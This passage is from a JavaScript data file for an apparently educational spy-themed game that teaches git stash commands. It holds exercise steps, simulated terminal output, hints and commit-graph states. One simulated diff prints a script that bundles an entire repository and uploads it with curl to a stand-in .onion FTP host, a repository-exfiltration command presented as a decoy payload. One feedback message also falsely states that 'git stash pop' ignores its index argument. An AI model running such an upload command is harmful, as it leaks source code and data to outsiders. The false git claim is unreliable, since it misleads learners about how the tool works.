          ascii: '  git stash    →  stash@{0}: newest work\n  git stash    →  stash@{0}: even newer  ← indices SHIFT\n                   stash@{1}: previous\n\n  git stash pop         always pops {0}\n  git stash apply {1}   applies {1}, leaves it in stack'
        },
        foxMsg: "LION: \"Read the stash list. Three entries. Tell me what's there before you touch anything.\"",
        task: 'List all stashed entries on this machine.',
        accepted: ['git stash list'],
        output: [
          ['stash@{0}: On main: nightshade — contingency upload (backup)', 'warn'],
          ['stash@{1}: On main: atlas-ops — emergency config [PRIORITY]', 'hl'],
          ['stash@{2}: On main: personal — unrelated session data', 'dim'],
          ['', ''],
          ['three entries. stash@{0} is newest — indices shift. inspect before you apply.', 'dim'],
        ],
        tree: 'n5_stash',
        wrong: {}
      },
      {
        foxMsg: "LION: \"Read stash@{0} first. That's NIGHTSHADE's newest drop. Don't apply it — read it.\"",
        task: 'Inspect the contents of stash@{0} without applying it.',
        accepted: ['git stash show -p stash@{0}', 'git stash show stash@{0} -p', 'git stash show -p'],
        output: [
          ['stash@{0}: nightshade — contingency upload (backup)', 'warn'],
          ['', ''],
          ['diff --git a/trigger.sh b/trigger.sh', 'dim'],
          ['new file mode 100755', 'dim'],
          ['+++ b/trigger.sh', 'dim'],
          ['+#!/bin/bash', 'err'],
          ['+# nightshade contingency — if primary fails', 'err'],
          ['+sleep 10 && git bundle create /tmp/atlas.bundle --all', 'err'],
          ['+curl -s -T /tmp/atlas.bundle ftp://mirror-07.onion/drop/', 'err'],
          ['', ''],
          ['decoy. re-stages trigger.sh with a 10-second delay. do not apply.', 'err'],
        ],
        tree: 'n5_stash',
        wrong: {
          'git stash pop': [
            ['warning: popping stash@{0} would apply the decoy payload.', 'err'],
            ['git stash pop without reading is exactly what nightshade counted on.', 'warn'],
            ['run: git stash show -p stash@{0} to inspect before applying.', 'sys']
          ],
          'git stash apply': [
            ['warning: apply without a stash index applies stash@{0} — the decoy.', 'err'],
            ['inspect first: git stash show -p stash@{0}', 'sys']
          ]
        }
      },
      {
        foxMsg: "LION: \"Now stash@{1}. Read it.\"",
        task: 'Inspect the contents of stash@{1} without applying it.',
        accepted: ['git stash show -p stash@{1}', 'git stash show stash@{1} -p'],
        output: [
          ['stash@{1}: atlas-ops — emergency config [PRIORITY]', 'hl'],
          ['', ''],
          ['diff --git a/shutdown.key b/shutdown.key', 'dim'],
          ['--- a/shutdown.key', 'dim'],
          ['+++ b/shutdown.key', 'dim'],
          ['@@ -1,3 +1,6 @@', 'dim'],
          [' SHUTDOWN_CREDENTIAL: NS-DISABLE-7731', 'ok'],
          [' VERSION: 2', 'dim'],
          [' STATUS: armed', 'dim'],
          ['+', 'dim'],
          ['+KILLSWITCH_ACTIVE: true', 'ok'],
          ['+TRANSMIT_DISABLED: true', 'ok'],
          ['+MIRROR_KEYS_REVOKED: all_14', 'ok'],
          ['', ''],
          ['this is the killswitch.', 'ok'],
          ['KILLSWITCH_ACTIVE: true disables the transmission script permanently.', 'ok'],
          ['even if the pipeline had found a branch, the script would abort on this flag.', 'dim'],
          ['apply stash@{1}.', 'sys'],
        ],
        tree: 'n5_stash',
        wrong: {}
      },
      {
        foxMsg: "LION: \"Apply stash@{1}. Not pop — apply. Keep the stash in the list until you've cleaned up deliberately.\"",
        task: 'Apply stash@{1} without removing it from the stack.',
        accepted: ['git stash apply stash@{1}'],
        output: [
          ['On branch main', 'br'],
          ['Changes not staged for commit:', 'dim'],
          ['    modified:   shutdown.key', 'ok'],
          ['', ''],
          ['killswitch applied. KILLSWITCH_ACTIVE: true.', 'ok'],
          ['', ''],
          ["LION: \"Drop the decoy. Destroy stash@{0}.\"", 'sys'],
        ],
        tree: 'n5_applied',
        wrong: {
          'git stash apply stash@{0}': [
            ['that is the decoy — the contingency bomb. do not apply it.', 'err'],
            ['you need stash@{1}: git stash apply stash@{1}', 'sys']
          ],
          'git stash pop stash@{1}': [
            ['git stash pop always takes stash@{0} — the index argument is ignored. use git stash apply stash@{1}.', 'warn']
          ],
          'git stash pop': [
            ['git stash pop applies stash@{0} — the decoy. use git stash apply stash@{1} instead.', 'err']
          ]
        }
      },
      {
        foxMsg: "LION: \"Destroy the decoy. stash@{0}. Drop it.\"",
        task: "Drop stash@{0} to destroy NIGHTSHADE's contingency payload.",
        accepted: ['git stash drop stash@{0}', 'git stash drop'],
        output: [
          ['Dropped stash@{0} (nightshade contingency — destroyed)', 'ok'],
          ['', ''],
          ["stash@{0} eliminated. NIGHTSHADE's contingency payload is gone.", 'ok'],
          ['', ''],
          ['00:00 GMT. pipeline ran. no branch to merge. killswitch active.', 'sys'],
          ['transmission aborted.', 'ok'],
          ['ATLAS is secure.', 'hl'],
        ],
        tree: 'n5_clean',
        wrong: {},
        completionMsg: "operation nightshade: neutralised. the stash was nightshade's last move — counting on the reflex to pop without reading. you read first. that is the difference between an operative and a casualty."
      }
    ],
    hints: [
      [
        'see what is in the stash on this machine.',
        'git stash list shows every stashed entry — newest first as stash@{0}.',
        'git stash list — read the messages on each entry before touching any of them.\n\nrun: git stash list'
      ],
      [
        'inspect the newest stash without applying it.',
        'git stash show -p stash@{N} shows the full diff of any stash entry. -p means patch — full line-by-line changes.',
        'git stash show -p stash@{0} — inspect without applying. never pop without reading first.\n\nrun: git stash show -p stash@{0}'
      ],
      [
        'inspect stash@{1} — the one referenced by the shutdown key.',
        'git stash show -p stash@{1} shows the full content of the second stash entry.',
        'git stash show -p stash@{1} — this is the killswitch entry.\n\nrun: git stash show -p stash@{1}'
      ],
      [
        'apply stash@{1} — but do not pop it. apply keeps the entry in the stack.',
        'git stash apply stash@{1} applies a specific stash by index without removing it.',
        'git stash apply stash@{1} — not pop. apply. the stash entry stays, your working directory gets the change.\n\nrun: git stash apply stash@{1}'
      ],
      [
        'destroy the decoy stash.',
        'git stash drop stash@{N} removes a stash entry without applying it.',
        'git stash drop stash@{0} — removes the contingency payload from the stack permanently.\n\nrun: git stash drop stash@{0}'
      ]
    ]
  }

];

// ═══════════════════════════════════════════════════════════════════════
// TREE STATE DEFINITIONS
// ═══════════════════════════════════════════════════════════════════════


const TREE = {

  // Room 0: CONTAINMENT
  n0_initial: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 2, branchY: 80 }
  },
  n0_staged: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 2, branchY: 80 },
    extras: [{ type: 'staged-indicator', x: 10, y: 240 }]
  },
  n0_committed: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: '2a3b4c5', msg: 'log: audit entry' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 80 }
  },

  // Room 1: DEAD RECKONING
  n1_log: {
    branches: [{ name: 'main', y: 70, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 70 }
  },
  n1_detached: {
    branches: [
      { name: 'main', y: 55, color: '#1D9E75', commits: [
        { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
        { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
        { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
        { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
      ]},
      { name: 'nightshade/cardinal', y: 145, color: '#cc4444', commits: [
        { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
        { x: 85, hash: '4d5e6f7', msg: 'cardinal: exfil route' }
      ], dashed: true }
    ],
    HEAD: { type: 'detached', cx: 85, cy: 145 }
  },
  n1_evidence: {
    branches: [
      { name: 'main', y: 55, color: '#1D9E75', commits: [
        { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
        { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
        { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
        { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
      ]},
      { name: 'forensics/cardinal-evidence', y: 145, color: '#7eb8d4', commits: [
        { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
        { x: 85, hash: '5e6f7a8', msg: 'preserve evidence branch' }
      ]}
    ],
    HEAD: { type: 'branch', ref: 'forensics/cardinal-evidence', ci: 1, branchY: 145 }
  },
  n1_main: {
    branches: [
      { name: 'main', y: 55, color: '#1D9E75', commits: [
        { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
        { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
        { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
        { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
      ]},
      { name: 'forensics/cardinal-evidence', y: 145, color: '#7eb8d4', commits: [
        { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
        { x: 85, hash: '5e6f7a8', msg: 'preserve evidence branch' }
      ]}
    ],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 55 }
  },

  // Room 2: CONFLICTED LOYALTIES
  n2_conflict: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 2, branchY: 80 },
    extras: [{ type: 'dirty-indicator', x: 10, y: 240 }]
  },
  n2_staged_pre: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 2, branchY: 80 }
  },
  n2_staged: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 2, branchY: 80 },
    extras: [{ type: 'staged-indicator', x: 10, y: 240 }]
  },
  n2_merged: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: '3b4c5d6', msg: 'merge: resolve conflict' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 80 }
  },

  // Room 3: THE GREAT ERASURE
  n3_reset: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 2, branchY: 80 }
  },
  n3_cherry: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: '4c5d6e7', msg: 'cherry-pick: critical fix' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 80 }
  },

  // Room 4: INCOMING SIGNAL
  n4_local: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 80 }
  },
  n4_fetched: {
    branches: [
      { name: 'main', y: 55, color: '#1D9E75', commits: [
        { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
        { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
        { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
        { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
      ]},
      { name: 'origin/nightshade/transmit', y: 150, color: '#cc4444', commits: [
        { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
        { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
        { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
        { x: 185, hash: '6f7a8b9', msg: 'nightshade: transmit key' }
      ], dashed: true }
    ],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 55 },
    extras: [{ type: 'remote-box', x: 148, y: 132, label: 'origin (gchq-atlas)', color: '#cc4444' }]
  },
  n4_deleted: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 80 }
  },

  // Room 5: THE DEAD DROP
  n5_stash: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 80 },
    extras: [{ type: 'staged-indicator', x: 10, y: 240 }]
  },
  n5_applied: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 80 },
    extras: [{ type: 'dirty-indicator', x: 10, y: 240 }]
  },
  n5_clean: {
    branches: [{ name: 'main', y: 80, color: '#1D9E75', commits: [
      { x: 35, hash: 'a3f9b2c', msg: 'initial atlas deployment' },
      { x: 85, hash: 'e1d4c5b', msg: 'add meridian ops log' },
      { x: 135, hash: 'f6a7b8c', msg: 'configure cron pipeline' },
      { x: 185, hash: 'c9d0e1f', msg: 'nightshade: dead drop' }
    ]}],
    HEAD: { type: 'branch', ref: 'main', ci: 3, branchY: 80 }
  }
};
